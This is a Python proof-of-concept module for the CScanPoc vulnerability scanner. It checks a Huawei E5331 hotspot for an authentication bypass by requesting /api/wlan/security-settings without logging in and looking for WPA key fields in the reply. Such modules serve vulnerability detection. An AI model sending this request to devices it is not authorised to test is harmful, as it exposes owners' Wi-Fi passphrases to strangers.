# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = '5973764f-1e99-47f1-8fdb-3aa8766894fd'
    name = 'Huawei E5331 API验证绕过漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2013-12-06'  # 漏洞公布时间
    desc = '''
        All discovered vulnerabilities can be exploited without authentication and therefore pose a high security risk.。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-61930' # 
    cnvd_id = 'CNVD-2014-0161' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Huawei E5331'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '692fd41b-6689-4b8a-a538-24b88f52da14' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/api/wlan/security-settings'
            response = requests.get(vul_url).content
            if re.search('<WifiWpapsk>', response) and re.search('<WifiWpaencryptionmodes>', response):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()